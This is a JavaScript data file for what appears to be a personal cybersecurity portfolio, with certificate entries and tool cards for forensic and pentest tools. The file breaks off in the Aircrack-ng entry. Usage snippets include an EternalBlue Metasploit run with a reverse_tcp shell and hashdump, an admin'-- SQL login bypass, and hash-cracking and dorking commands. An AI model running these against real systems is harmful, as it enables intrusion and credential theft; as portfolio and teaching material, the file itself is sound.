/* Editable site data. Cards are static HTML in index.html; this file feeds the dialogs and the sections that update at runtime.
   - projects[id].state / repos[id].state : public | completed | in-development | experimental | archived  (labels: statuses)
   - projects[id].demo                    : optional URL, shows a "Live demo" button
   - thm                                  : manually maintained TryHackMe snapshot (update lastVerified when you re-check your profile)
   - certs                                : certificate cards (status: completed | pursuing | planned)
   - github                               : live GitHub settings (user, featured repos, cache time) */
window.SITE = {
 "statuses": {
  "public": "Public repository",
  "completed": "Completed",
  "in-development": "In Development",
  "experimental": "Experimental",
  "archived": "Archived"
 },
 "github": {
  "user": "bhaktabsharma",
  "profile": "https://github.com/bhaktabsharma",
  "allRepos": "https://github.com/bhaktabsharma?tab=repositories",
  "api": "https://api.github.com/users/bhaktabsharma/repos?sort=updated&per_page=100",
  "featured": [
   "BugBounty-Recon-Engine",
   "ReconForge",
   "SQL-INJECTION-LAB"
  ],
  "cacheMinutes": 30,
  "pageSize": 8,
  "snapshotDate": "2026-11-11"
 },
 "thm": {
  "username": "bhaktabsharma",
  "profileUrl": "https://tryhackme.com/p/bhaktabsharma",
  "lastVerified": "2026-11-11",
  "source": "manual",
  "stats": [
   {
    "label": "Global rank",
    "value": 1,
    "prefix": "Top ",
    "suffix": "%"
   },
   {
    "label": "Rooms done",
    "value": 200,
    "suffix": "+"
   },
   {
    "label": "Day streak",
    "value": 250,
    "suffix": "+"
   },
   {
    "label": "Paths completed",
    "value": 2
   }
  ],
  "paths": [
   {
    "name": "Jr Penetration Tester",
    "state": "done"
   },
   {
    "name": "SOC Level 1",
    "state": "done"
   },
   {
    "name": "Red Teaming",
    "state": "wip"
   },
   {
    "name": "Cyber Defence",
    "state": "wip"
   }
  ]
 },
 "certs": [
  {
   "id": "cert-nvhdf",
   "status": "completed",
   "seal": "A+",
   "issuer": "NewVersionHacker",
   "title": "NVH Digital Forensic",
   "subtitle": "3-month program · Grade A+",
   "date": "2026-06-08",
   "dateLabel": "8 Jun 2026",
   "validUntil": "9 Jun 2028",
   "credentialId": "CN-NVHDF26B07002AB",
   "credentialLabel": "Certificate no.",
   "file": "assets/certificate.pdf",
   "download": "Bhakta-Sharma-NVH-Digital-Forensic-Certificate.pdf",
   "preview": "assets/previews/nvh-digital-forensic.jpg",
   "thumb": "assets/previews/nvh-digital-forensic-thumb.jpg",
   "detail": "cert-nvhdf"
  },
  {
   "id": "cert-eh101",
   "status": "completed",
   "seal": "101",
   "issuer": "Simplilearn SkillUP",
   "title": "Ethical Hacking 101: Beginners Guide",
   "subtitle": "Online course · certificate of completion",
   "date": "2026-06-12",
   "dateLabel": "12 Jun 2026",
   "credentialId": "10338271",
   "credentialLabel": "Certificate code",
   "file": "assets/ceh_cert.pdf",
   "download": "Bhakta-Sharma-Ethical-Hacking-101-Certificate.pdf",
   "preview": "assets/previews/ethical-hacking-101.jpg",
   "thumb": "assets/previews/ethical-hacking-101-thumb.jpg",
   "detail": "cert-eh101"
  },
  {
   "id": "cert-ceh",
   "status": "pursuing",
   "seal": "CEH",
   "issuer": "EC-Council",
   "title": "Certified Ethical Hacker (CEH v12)",
   "subtitle": "Currently pursuing",
   "detail": "cert-ceh"
  },
  {
   "id": "cert-chfi",
   "status": "pursuing",
   "seal": "CHFI",
   "issuer": "EC-Council",
   "title": "Computer Hacking Forensic Investigator (CHFI)",
   "subtitle": "Currently pursuing",
   "detail": "cert-chfi"
  },
  {
   "id": "rm-jrpt",
   "status": "completed",
   "seal": "THM",
   "issuer": "TryHackMe",
   "title": "Jr Penetration Tester",
   "subtitle": "Learning path",
   "dateLabel": "2024",
   "detail": "rm-jrpt",
   "profile": true
  },
  {
   "id": "rm-soc",
   "status": "completed",
   "seal": "THM",
   "issuer": "TryHackMe",
   "title": "SOC Level 1",
   "subtitle": "Learning path",
   "dateLabel": "2024",
   "detail": "rm-soc",
   "profile": true
  }
 ],
 "tools": {
  "autopsy": {
   "name": "Autopsy",
   "cat": "Digital Forensics · GUI Platform",
   "summary": "Autopsy is an open-source digital forensics platform and the graphical interface to The Sleuth Kit. It is widely used by law enforcement, corporate investigators, and security researchers to examine hard drives, disk images, and mobile devices.",
   "features": [
    {
     "title": "File System Analysis",
     "desc": "<strong>File system analysis</strong> — navigates NTFS, FAT, Ext4, and HFS+ partitions; recovers deleted files and unallocated space; displays full directory trees with MAC timestamps."
    },
    {
     "title": "Keyword Search",
     "desc": "<strong>Keyword & regex search</strong> — indexes the entire image and runs concurrent keyword lists across all file content, including carved fragments and file slack space."
    },
    {
     "title": "Timeline Analysis",
     "desc": "<strong>Timeline generation</strong> — aggregates file MAC times, log entries, browser history, and registry timestamps into a single unified event timeline for attack reconstruction."
    },
    {
     "title": "Hash Filtering",
     "desc": "<strong>Hash filtering</strong> — auto-flags known malware via NSRL and custom hash sets; filters out known-good system files so analysis focuses on what actually matters."
    },
    {
     "title": "Web Artifacts",
     "desc": "<strong>Web artifact extraction</strong> — parses Chrome, Firefox, Edge, and IE history, downloads, cookies, and cached content automatically without manual SQLite querying."
    },
    {
     "title": "Email & Registry",
     "desc": "<strong>Email & registry parsing</strong> — ingests PST/OST mailboxes and Windows registry hives for user activity, installed programs, USB history, and network connections."
    }
   ],
   "usage": {
    "label": "kali@forensics — autopsy",
    "code": "<span class=\"cmd\">autopsy &amp;</span>                          <span class=\"cmt\"># launch GUI on localhost:9999</span>\n<span class=\"out\">→ Create New Case → Add Data Source → Disk Image (.dd/.E01/.vmdk)</span>\n<span class=\"out\">→ Run Ingest Modules: Hash Lookup, Keyword Search, File Type ID</span>\n<span class=\"hi\">→ Results tree: Deleted Files, Web History, Recent Documents, USB Devices</span>\n<span class=\"warn\"># Export timeline: Generate Timeline → Body file → mactime output</span>"
   },
   "tags": [
    "DFIR",
    "Disk Forensics",
    "File Carving",
    "Timeline",
    "Deleted Files",
    "GUI"
   ],
   "group": "Digital Forensics",
   "docs": "https://www.autopsy.com/",
   "evidence": []
  },
  "volatility": {
   "name": "Volatility 3",
   "cat": "Memory Forensics · CLI Framework",
   "summary": "Volatility is the industry-standard open-source memory forensics framework. It analyses RAM dumps from Windows, Linux, and macOS systems to extract processes, network connections, loaded drivers, registry hives, and injected code — all without booting the system.",
   "features": [
    {
     "title": "Process Analysis",
     "desc": "<strong>Process analysis</strong> — pstree and psscan enumerate running and hidden processes; cross-referencing both detects DKOM-hidden rootkit processes invisible to the OS."
    },
    {
     "title": "Injection Detection",
     "desc": "<strong>Code injection detection</strong> — malfind identifies memory regions marked PAGE_EXECUTE_READWRITE containing PE headers, the hallmark signature of process injection and shellcode."
    },
    {
     "title": "Network Artefacts",
     "desc": "<strong>Network connection recovery</strong> — netstat reads connection pool memory to reconstruct active and recently closed TCP/UDP connections even after the process exits."
    },
    {
     "title": "Credential Extraction",
     "desc": "<strong>Credential extraction</strong> — hashdump and lsadump pull NTLM password hashes, LSA secrets, and cached domain credentials directly from LSASS memory."
    },
    {
     "title": "File & Registry",
     "desc": "<strong>File & registry access</strong> — filescan lists open file handles; printkey and hivelist expose loaded registry hives and their key-value content directly from memory."
    },
    {
     "title": "Command History",
     "desc": "<strong>Command history recovery</strong> — cmdline and consoles reconstruct every command run in CMD and PowerShell sessions, including those the attacker tried to clear."
    }
   ],
   "usage": {
    "label": "kali@forensics — volatility 3",
    "code": "<span class=\"cmd\">python3 vol.py -f memdump.raw windows.info</span>        <span class=\"cmt\"># identify OS</span>\n<span class=\"cmd\">python3 vol.py -f memdump.raw windows.pstree</span>      <span class=\"cmt\"># process tree</span>\n<span class=\"cmd\">python3 vol.py -f memdump.raw windows.malfind</span>     <span class=\"cmt\"># injected code</span>\n<span class=\"cmd\">python3 vol.py -f memdump.raw windows.netstat</span>     <span class=\"cmt\"># network connections</span>\n<span class=\"cmd\">python3 vol.py -f memdump.raw windows.hashdump</span>    <span class=\"cmt\"># NTLM hashes</span>\n<span class=\"hi\">→ Output: suspicious svchost PID 2496 — PE injected, ESTABLISHED → 185.220.101.47:443</span>"
   },
   "tags": [
    "Memory Forensics",
    "DFIR",
    "Malware",
    "Process Injection",
    "Credentials",
    "Python"
   ],
   "group": "Digital Forensics",
   "docs": "https://volatility3.readthedocs.io/",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-vol",
     "label": "Volatility (room)"
    },
    {
     "type": "writeup",
     "id": "memfor",
     "label": "Memory Forensics (writeup)"
    }
   ]
  },
  "ftk": {
   "name": "FTK Imager",
   "cat": "Evidence Acquisition · Imaging Tool",
   "summary": "FTK Imager is the gold-standard free tool from AccessData for forensically sound evidence acquisition. It creates bitstream images of physical drives, logical volumes, and removable media while generating hash verification values to guarantee chain-of-custody integrity.",
   "features": [
    {
     "title": "Forensic Imaging",
     "desc": "<strong>Forensic imaging</strong> — creates E01 (Expert Witness), DD (raw), AD1, and AFF4 image formats from physical disks, logical drives, USB devices, and memory cards."
    },
    {
     "title": "Hash Verification",
     "desc": "<strong>Hash verification</strong> — simultaneously computes MD5 and SHA1 hashes during acquisition and embeds them in the image log; re-verification proves the image was never modified."
    },
    {
     "title": "Write Blocking",
     "desc": "<strong>Write-block awareness</strong> — works with hardware write blockers to guarantee zero writes to the original evidence device, satisfying legal chain-of-custody requirements."
    },
    {
     "title": "Live Preview",
     "desc": "<strong>Live evidence preview</strong> — mounts images in read-only mode to browse files, view deleted items, and export specific files without modifying the image."
    },
    {
     "title": "Memory Capture",
     "desc": "<strong>Memory acquisition</strong> — captures a full RAM dump from a live Windows system for subsequent Volatility analysis, preserving volatile evidence before shutdown."
    },
    {
     "title": "Custom Reports",
     "desc": "<strong>Acquisition reports</strong> — auto-generates a signed acquisition report with source drive details, timestamps, hash values, and investigator information for court submission."
    }
   ],
   "usage": {
    "label": "FTK Imager — acquisition workflow",
    "code": "<span class=\"out\">File → Create Disk Image → Physical Drive → Select source device</span>\n<span class=\"out\">Add Destination → E01 format → Set segment size: 2GB</span>\n<span class=\"out\">Case Number, Examiner Name, Evidence ID → Start</span>\n<span class=\"hi\">→ MD5:  a3b4c1d9e5f2a0b7c8d4e1f3a5b2c9d6</span>\n<span class=\"hi\">→ SHA1: 7f3e8b1c4a9d2f6e0b5c8a3d7f2e9b4c1a6d3f8e</span>\n<span class=\"warn\"># Verify: re-hash the E01 → hashes must match exactly</span>"
   },
   "tags": [
    "Evidence Acquisition",
    "E01",
    "Chain of Custody",
    "DFIR",
    "Disk Imaging",
    "Memory Dump"
   ],
   "group": "Digital Forensics",
   "docs": "https://www.exterro.com/digital-forensics-software/ftk-imager",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-ir",
     "label": "Incident Response (room)"
    }
   ]
  },
  "wireshark": {
   "name": "Wireshark",
   "cat": "Network Forensics · Packet Analyser",
   "summary": "Wireshark is the world's most widely-used network protocol analyser. It captures live network traffic and dissects hundreds of protocols in real time, making it indispensable for network forensics, C2 detection, malware traffic analysis, and troubleshooting.",
   "features": [
    {
     "title": "Live Capture",
     "desc": "<strong>Live packet capture</strong> — captures traffic on any interface (Ethernet, Wi-Fi, loopback) using BPF capture filters to target only relevant traffic from the first packet."
    },
    {
     "title": "Display Filters",
     "desc": "<strong>Powerful display filters</strong> — Wireshark's filter language lets you isolate any protocol field; e.g. http.request.method==\"POST\" or dns.qry.name contains \"evil\"."
    },
    {
     "title": "Stream Following",
     "desc": "<strong>Stream reconstruction</strong> — follow TCP/UDP/HTTP streams to read full application-layer conversations in plaintext, revealing credentials, commands, and exfiltrated data."
    },
    {
     "title": "Object Export",
     "desc": "<strong>File object extraction</strong> — exports files transferred over HTTP, SMB, FTP, and DICOM directly from the PCAP; SHA256-verify exported binaries against VirusTotal."
    },
    {
     "title": "Traffic Statistics",
     "desc": "<strong>Traffic statistics</strong> — Protocol Hierarchy, Conversations, Endpoints, and I/O graphs rapidly identify dominant talkers, unusual protocols, and beacon intervals."
    },
    {
     "title": "tshark CLI",
     "desc": "<strong>tshark automation</strong> — the CLI version enables scripted analysis, field extraction with -T fields -e, and integration into Python or Bash forensics pipelines."
    }
   ],
   "usage": {
    "label": "tshark — C2 beacon detection",
    "code": "<span class=\"cmd\">tshark -r capture.pcap -q -z conv,tcp | sort -k1 -rn | head -10</span>\n<span class=\"hi\">192.168.1.105 → 185.220.101.47:80   Frames:88   Bytes:1.2MB</span>\n<span class=\"cmd\">tshark -r capture.pcap -Y 'http.host==\"185.220.101.47\"' -T fields -e frame.time -e http.request.uri</span>\n<span class=\"hi\">14:02:01  GET /gate.php?id=host&amp;os=win7&amp;av=0</span>\n<span class=\"hi\">14:03:01  GET /gate.php?id=host&amp;os=win7&amp;av=0</span>\n<span class=\"warn\"># Beacon interval: ~60s ± 0.5s → Zeus/ZBot C2 pattern</span>"
   },
   "tags": [
    "Network Forensics",
    "PCAP",
    "C2 Detection",
    "tshark",
    "Protocol Analysis",
    "IOC"
   ],
   "group": "Network Security",
   "docs": "https://www.wireshark.org/docs/",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-mal",
     "label": "Malware Analysis (room)"
    },
    {
     "type": "writeup",
     "id": "rm-ws",
     "label": "Wireshark (room)"
    },
    {
     "type": "writeup",
     "id": "pcap",
     "label": "PCAP Analysis (writeup)"
    }
   ]
  },
  "nmap": {
   "name": "Nmap",
   "cat": "Reconnaissance · Port Scanner",
   "summary": "Nmap (Network Mapper) is the de-facto standard open-source network scanner used by security professionals worldwide. It discovers hosts, enumerates open ports, fingerprints services and OS versions, and runs scripted vulnerability checks — all in one tool.",
   "features": [
    {
     "title": "Port Scanning",
     "desc": "<strong>Port scanning modes</strong> — SYN scan (-sS) for speed and stealth, Connect scan (-sT) when unprivileged, UDP scan (-sU) to catch DNS/SNMP/DHCP services often overlooked."
    },
    {
     "title": "Service Detection",
     "desc": "<strong>Service & version detection</strong> — -sV sends protocol-specific probes and matches banners to a database of 11,000+ service signatures, identifying exact software versions."
    },
    {
     "title": "OS Fingerprinting",
     "desc": "<strong>OS fingerprinting</strong> — -O analyses TCP/IP stack behaviour (TTL, window size, sequence numbers) to identify the target OS and version with confidence percentages."
    },
    {
     "title": "NSE Scripts",
     "desc": "<strong>Nmap Scripting Engine (NSE)</strong> — 600+ scripts for vulnerability detection (--script vuln), brute-forcing, service enumeration, and exploitation assistance."
    },
    {
     "title": "Network Discovery",
     "desc": "<strong>Host discovery</strong> — ping sweeps, ARP scans on local subnets, and traceroute integration to map live hosts across entire subnets before targeting specific machines."
    },
    {
     "title": "Speed Tuning",
     "desc": "<strong>Timing templates</strong> — -T0 to -T5 control scan aggressiveness; -T4 for standard pentests, -T1 for IDS evasion; --min-rate and --max-retries for fine-grained control."
    }
   ],
   "usage": {
    "label": "kali@forensics — nmap recon",
    "code": "<span class=\"cmd\">nmap -sV -sC -O -p- --min-rate 5000 -oA scan_results 10.10.x.x</span>\n<span class=\"hi\">PORT     STATE  SERVICE   VERSION</span>\n<span class=\"hi\">22/tcp   open   ssh       OpenSSH 7.4 (Ubuntu)</span>\n<span class=\"hi\">80/tcp   open   http      Apache 2.4.18</span>\n<span class=\"hi\">445/tcp  open   smb       Windows 7 SP1</span>\n<span class=\"cmd\">nmap --script vuln -p 445 10.10.x.x</span>\n<span class=\"warn\">→ VULNERABLE: smb-vuln-ms17-010 (CVE-2017-0143)</span>"
   },
   "tags": [
    "Reconnaissance",
    "Port Scanning",
    "NSE",
    "Vulnerability Detection",
    "OSCP",
    "Pentesting"
   ],
   "group": "Network Security",
   "docs": "https://nmap.org/docs.html",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-blue",
     "label": "Blue (room)"
    },
    {
     "type": "writeup",
     "id": "rm-jrpt",
     "label": "Jr Pentester (room)"
    },
    {
     "type": "writeup",
     "id": "blue",
     "label": "Blue (writeup)"
    }
   ]
  },
  "metasploit": {
   "name": "Metasploit Framework",
   "cat": "Exploitation · Post-Exploitation",
   "summary": "The Metasploit Framework is the world's most used penetration testing platform. It provides a library of 2,000+ exploit modules, payloads, and post-exploitation tools in a unified console.",
   "features": [
    {
     "title": "Exploit Modules",
     "desc": "<strong>Exploit library</strong> — 2,000+ modules covering CVEs across Windows, Linux, web applications, IoT, and network devices; modules are ranked by reliability and impact."
    },
    {
     "title": "Meterpreter",
     "desc": "<strong>Meterpreter payload</strong> — an advanced in-memory agent that provides file system access, process management, screenshot capture, keylogging, pivoting, and credential dumping without touching disk."
    },
    {
     "title": "Privilege Escalation",
     "desc": "<strong>Post-exploitation modules</strong> — getsystem attempts token impersonation and named pipe exploitation to escalate to SYSTEM; local_exploit_suggester recommends kernel exploits based on OS patch level."
    },
    {
     "title": "Pivoting",
     "desc": "<strong>Network pivoting</strong> — route and socks_proxy modules allow attackers to tunnel traffic through a compromised host into segregated internal networks, enabling lateral movement."
    },
    {
     "title": "Auxiliary Modules",
     "desc": "<strong>Auxiliary modules</strong> — scanners (SMB, SSH, FTP brute-force), fuzzers, credential sprayers, and service enumerators that work independently of exploits."
    },
    {
     "title": "Database Integration",
     "desc": "<strong>PostgreSQL workspace</strong> — stores hosts, services, vulnerabilities, and credentials from every engagement; db_nmap imports Nmap results directly into the Metasploit database."
    }
   ],
   "usage": {
    "label": "msfconsole — EternalBlue",
    "code": "<span class=\"cmd\">msfconsole -q</span>\n<span class=\"cmd\">use exploit/windows/smb/ms17_010_eternalblue</span>\n<span class=\"cmd\">set RHOSTS 10.10.x.x ; set LHOST 10.10.y.y</span>\n<span class=\"cmd\">set payload windows/x64/meterpreter/reverse_tcp ; run</span>\n<span class=\"hi\">[+] Meterpreter session 1 opened — NT AUTHORITY\\SYSTEM</span>\n<span class=\"cmd\">hashdump</span>\n<span class=\"hi\">Administrator:500:aad3b435:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>"
   },
   "tags": [
    "Exploitation",
    "Meterpreter",
    "Post-Exploitation",
    "CVE",
    "Pivoting",
    "Pentesting"
   ],
   "group": "Penetration Testing",
   "docs": "https://docs.metasploit.com/",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-blue",
     "label": "Blue (room)"
    },
    {
     "type": "writeup",
     "id": "rm-jrpt",
     "label": "Jr Pentester (room)"
    },
    {
     "type": "writeup",
     "id": "blue",
     "label": "Blue (writeup)"
    }
   ]
  },
  "burp": {
   "name": "Burp Suite",
   "cat": "Web Application Security · Proxy",
   "summary": "Burp Suite is the leading toolkit for web application security testing. Its intercepting proxy sits between the browser and server, giving full visibility and control over every HTTP/S request and response.",
   "features": [
    {
     "title": "Intercepting Proxy",
     "desc": "<strong>HTTP/S proxy</strong> — intercepts and modifies every request and response in real time; essential for manipulating parameters, cookies, headers, and hidden form fields the browser never exposes."
    },
    {
     "title": "Repeater",
     "desc": "<strong>Repeater</strong> — resend any captured request with modifications and compare responses side-by-side; the primary tool for manually testing SQL injection, XSS, SSRF, and authentication bypass."
    },
    {
     "title": "Intruder",
     "desc": "<strong>Intruder</strong> — automated fuzzer for brute-forcing login forms, fuzzing parameters with wordlists, and enumerating IDs (IDOR testing) with sniper, battering ram, and cluster bomb attack modes."
    },
    {
     "title": "Spider / Scanner",
     "desc": "<strong>Active scanner (Pro)</strong> — crawls the entire application and actively tests for SQLi, XSS, XXE, SSRF, command injection, and deserialization vulnerabilities with low false-positive rates."
    },
    {
     "title": "Decoder",
     "desc": "<strong>Decoder / Comparer</strong> — rapidly encodes/decodes Base64, URL, HTML, hex, and gzip; the Comparer diffs two responses to spot subtle differences that reveal injection or logic flaws."
    },
    {
     "title": "Extensions",
     "desc": "<strong>BApp extensions</strong> — Turbo Intruder (high-speed fuzzing), JWT Editor (token manipulation), Logger++ (advanced logging), and CORS* extend Burp's capabilities for specialist attacks."
    }
   ],
   "usage": {
    "label": "Burp Suite — SQLi discovery",
    "code": "<span class=\"out\">Proxy → Intercept ON → browse target → capture login POST</span>\n<span class=\"out\">Right-click → Send to Repeater</span>\n<span class=\"cmd\">POST /login HTTP/1.1\nusername=admin'--&amp;password=anything</span>\n<span class=\"hi\">HTTP/1.1 200 OK  → Logged in as admin</span>\n<span class=\"cmt\"># Single quote breaks SQL → comment truncates password check</span>\n<span class=\"warn\"># Send to Intruder → fuzz password field with rockyou.txt</span>"
   },
   "tags": [
    "Web App Testing",
    "Proxy",
    "SQLi",
    "XSS",
    "IDOR",
    "SSRF",
    "Fuzzing"
   ],
   "group": "Web Application Security",
   "docs": "https://portswigger.net/burp/documentation",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-jrpt",
     "label": "Jr Pentester (room)"
    }
   ]
  },
  "kali": {
   "name": "Kali Linux",
   "cat": "Security OS · Daily Driver Platform",
   "summary": "Kali Linux is the industry-standard Debian-based Linux distribution purpose-built for penetration testing, digital forensics, and red team operations. Maintained by Offensive Security, it ships with 600+ pre-installed security tools.",
   "features": [
    {
     "title": "600+ Preinstalled Tools",
     "desc": "<strong>600+ pre-installed tools</strong> — organised into categories: information gathering, vulnerability analysis, exploitation, post-exploitation, forensics, reverse engineering, social engineering, and reporting."
    },
    {
     "title": "Custom Kernels",
     "desc": "<strong>Hardened kernel patches</strong> — Kali ships with a custom kernel that includes wireless injection patches (for Aircrack-ng), support for more hardware adapters, and audit framework integration."
    },
    {
     "title": "Rolling Release",
     "desc": "<strong>Rolling release model</strong> — constantly updated from Debian testing; security tools are always the latest version without needing to reinstall the OS, unlike point-release distros."
    },
    {
     "title": "Deployment Flexibility",
     "desc": "<strong>Flexible deployment</strong> — runs as a VM (VMware/VirtualBox), Docker container, WSL2 on Windows, live USB (persistence-enabled), Raspberry Pi, or cloud instance on AWS/Azure."
    },
    {
     "title": "Forensics Mode",
     "desc": "<strong>Forensics boot mode</strong> — boots without mounting any drives or enabling swap, preventing contamination of evidence media; ideal for live forensic examination of seized devices."
    },
    {
     "title": "Wireless Arsenal",
     "desc": "<strong>Wireless security tools</strong> — Aircrack-ng, Kismet, Reaver, and hostapd-wpe for WPA/WPA2 cracking, rogue AP attacks, and wireless network auditing out of the box."
    }
   ],
   "usage": {
    "label": "kali@forensics:~",
    "code": "<span class=\"cmd\">kali-tweaks</span>                        <span class=\"cmt\"># configure shell, network, metapackages</span>\n<span class=\"cmd\">sudo apt install kali-linux-everything</span> <span class=\"cmt\"># full tool suite</span>\n<span class=\"cmd\">searchsploit ms17-010</span>              <span class=\"cmt\"># search local exploit-db</span>\n<span class=\"hi\">EDB-ID 42315 | Windows SMB Remote Code Execution (MS17-010)</span>\n<span class=\"cmd\">msfdb init &amp;&amp; msfconsole</span>          <span class=\"cmt\"># initialise Metasploit DB</span>\n<span class=\"warn\"># Forensics mode: boot with \"forensics\" at GRUB — no disk mounts</span>"
   },
   "tags": [
    "Linux",
    "Pentesting OS",
    "Forensics Mode",
    "Rolling Release",
    "600+ Tools",
    "Daily Driver"
   ],
   "group": "Penetration Testing",
   "docs": "https://www.kali.org/docs/",
   "evidence": []
  },
  "hashcat": {
   "name": "Hashcat",
   "cat": "Password Cracking · GPU Accelerated",
   "summary": "Hashcat is the world's fastest and most advanced password recovery tool, leveraging GPU acceleration to crack hashes orders of magnitude faster than CPU-based crackers. It supports 300+ hash types and dozens of attack modes.",
   "features": [
    {
     "title": "GPU Acceleration",
     "desc": "<strong>GPU acceleration</strong> — uses OpenCL and CUDA to leverage thousands of GPU cores simultaneously; a modern GPU cracks MD5 at 60+ billion hashes per second vs a CPU's 1 billion."
    },
    {
     "title": "300+ Hash Types",
     "desc": "<strong>300+ supported algorithms</strong> — MD5 (-m 0), SHA1 (-m 100), NTLM (-m 1000), NetNTLMv2 (-m 5600), bcrypt (-m 3200), Kerberos TGS (-m 13100), WPA2 (-m 22000), and more."
    },
    {
     "title": "Attack Modes",
     "desc": "<strong>Multiple attack modes</strong> — dictionary (-a 0), combinator (-a 1), brute-force mask (-a 3), hybrid wordlist+mask (-a 6), and rule-based attacks to maximise crack rate with minimal time."
    },
    {
     "title": "Rule Engine",
     "desc": "<strong>Rule-based mutation</strong> — applies transformation rules (append digits, capitalise, leet-speak substitution) to wordlist candidates; rockyou-30000.rule covers the most common real-world passwords."
    },
    {
     "title": "Mask Attacks",
     "desc": "<strong>Mask attacks</strong> — custom character sets for targeted brute-force; e.g. ?u?l?l?l?l?d?d?d?s targets patterns like \"Password123!\" matching corporate password policies."
    },
    {
     "title": "Session Management",
     "desc": "<strong>Session restore</strong> — --session and --restore allow long-running jobs to be paused and resumed; --status shows live crack rate, progress percentage, and ETA."
    }
   ],
   "usage": {
    "label": "hashcat — multi-mode examples",
    "code": "<span class=\"cmd\">hashcat -m 1000 ntlm.txt rockyou.txt</span>                 <span class=\"cmt\"># NTLM dictionary</span>\n<span class=\"cmd\">hashcat -m 13100 kerb.hash rockyou.txt -r best64.rule</span>  <span class=\"cmt\"># Kerberoast</span>\n<span class=\"cmd\">hashcat -m 22000 wpa.hc22000 rockyou.txt</span>             <span class=\"cmt\"># WPA2 crack</span>\n<span class=\"cmd\">hashcat -m 0 md5.txt -a 3 ?u?l?l?l?d?d?d?s</span>          <span class=\"cmt\"># mask attack</span>\n<span class=\"hi\">ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22</span>\n<span class=\"warn\"># Speed: NTLM ~14 GH/s on RTX 3090</span>"
   },
   "tags": [
    "Password Cracking",
    "GPU",
    "NTLM",
    "Kerberoasting",
    "WPA2",
    "CTF"
   ],
   "group": "Penetration Testing",
   "docs": "https://hashcat.net/wiki/",
   "evidence": []
  },
  "osint": {
   "name": "OSINT Framework",
   "cat": "Open-Source Intelligence · Recon",
   "summary": "The OSINT Framework is a structured methodology and toolset for gathering intelligence from publicly available sources — without ever touching the target directly.",
   "features": [
    {
     "title": "Google Dorking",
     "desc": "<strong>Google advanced search operators</strong> — site:, filetype:, intitle:, inurl:, and cache: operators to surface exposed admin panels, sensitive PDFs, backup files, and indexed credentials."
    },
    {
     "title": "Shodan",
     "desc": "<strong>Shodan</strong> — searches internet-facing devices by banner, port, SSL certificate, organisation, and CVE tag; used to map the external attack surface and find vulnerable services before internal testing."
    },
    {
     "title": "DNS Enumeration",
     "desc": "<strong>DNS intelligence</strong> — dig, nslookup, and dnsx for zone transfers, subdomain brute-forcing, SPF/DMARC record analysis; theHarvester for email and subdomain harvesting from search engines."
    },
    {
     "title": "EXIF Metadata",
     "desc": "<strong>Image metadata extraction</strong> — exiftool extracts GPS coordinates, device model, timestamps, and creator information from photos posted online, often revealing physical locations."
    },
    {
     "title": "Social Media",
     "desc": "<strong>Social & email intelligence</strong> — LinkedIn enumeration for org structure and employee names, hunter.io for email pattern discovery, HaveIBeenPwned for breach exposure checks."
    },
    {
     "title": "Maltego Integration",
     "desc": "<strong>Maltego transforms</strong> — automated graph-based link analysis connecting domains, IPs, emails, phone numbers, and social profiles into a visual relationship map for target profiling."
    }
   ],
   "usage": {
    "label": "kali@forensics — osint workflow",
    "code": "<span class=\"cmd\">theHarvester -d target.com -b google,bing,linkedin -f output</span>\n<span class=\"hi\">→ Emails: j.smith@target.com, admin@target.com</span>\n<span class=\"hi\">→ Subdomains: vpn.target.com, mail.target.com, dev.target.com</span>\n<span class=\"cmd\">exiftool photo.jpg | grep -E \"GPS|Software|Creator\"</span>\n<span class=\"hi\">GPS Latitude: 27° 42' 15.00\" N    GPS Longitude: 85° 18' 45.00\" E</span>\n<span class=\"warn\"># Google dork: site:target.com filetype:pdf \"confidential\"</span>"
   },
   "tags": [
    "OSINT",
    "Reconnaissance",
    "Shodan",
    "DNS",
    "Metadata",
    "Google Dorking",
    "theHarvester"
   ],
   "group": "Penetration Testing",
   "docs": "https://osintframework.com/",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-osint",
     "label": "OSINT (room)"
    },
    {
     "type": "writeup",
     "id": "rm-jrpt",
     "label": "Jr Pentester (room)"
    }
   ]
  },
  "aircrack": {
   "name": "Aircrack-ng",
   "cat": "Wireless Security · 802.11 Auditing",
   "summary": "Aircrack-ng is the complete open-source suite for 802.11 wireless network security assessment. It covers every phase of a wireless penetration test — from monitor mode and packet capture through deauthentication attacks, handshake capture, and offline WPA2 key cracking.",
   "features": [
    {
     "title": "Monitor Mode",
     "desc": "<strong>Monitor mode setup</strong> — airmon-ng enables promiscuous capture on wireless adapters; the adapter receives all 802.11 frames on the channel, not just frames addressed to it."
    },
    {
     "title": "Network Discovery",
     "desc": "<strong>airodump-ng scanning</strong> — discovers all nearby access points and associated clients, showing SSID, BSSID, channel, signal strength, encryption type, and data frame counts."
    },
    {
     "title": "Deauth Attacks",
     "desc": "<strong>Deauthentication injection</strong> — aireplay-ng sends forged 802.11 deauth frames to force clients to disconnect and reconnect, triggering a WPA2 4-way handshake capture."
    },
    {
     "title": "Handshake Capture",
     "desc": "<strong>4-way handshake capture</strong> — the WPA2 handshake contains a hash of the pre-shared key; captured with airodump-ng and saved as a .cap file for offline cracking."
    },
    {
     "title": "WPA2 Cracking",
     "desc": "<strong>Offline key cracking</strong> — aircrack-ng performs dictionary attacks against captured handshakes; convert to .hc22000 format with hcxtools for GPU cracking with Hashcat."
    },
    {
     "title": "WEP Cracking",
     "desc": "<strong>WEP statistical attacks</strong> — aireplay-ng performs ARP request replay to generate IVs; aircrack-ng statistically recovers the WEP key from ~40,000 IVs in minutes."
    }
   ],
   "usage": {
    "label": "kali@forensics — WPA2 audit",
